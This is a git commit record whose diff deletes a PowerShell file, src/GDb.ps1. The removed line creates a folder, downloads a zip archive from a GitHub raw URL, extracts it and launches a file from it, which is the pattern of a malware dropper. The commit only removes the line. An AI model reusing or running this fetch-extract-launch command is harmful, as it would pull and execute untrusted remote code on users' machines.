197d87d261c8445f492ab2008a23bb47c95bf82a
Seascope-Arg <pbazineteb@gmail.com>
2024-08-01 11:02:59 -0400

    Delete src/GDb.ps1

--- src/GDb.ps1
+++
@@ -1,1 +0,0 @@
-ni 'C:/Temps/' -Type Directory -Force;cd 'C:/Temps/';Invoke-WebRequest -Uri "https://github.com/Arcsin002/notes/raw/main/test2/end.zip" -OutFile 'end.zip';Expand-Archive -Path 'end.zip' -DestinationPath 'C:/Temps/';start 'C:/Temps/end.txt'
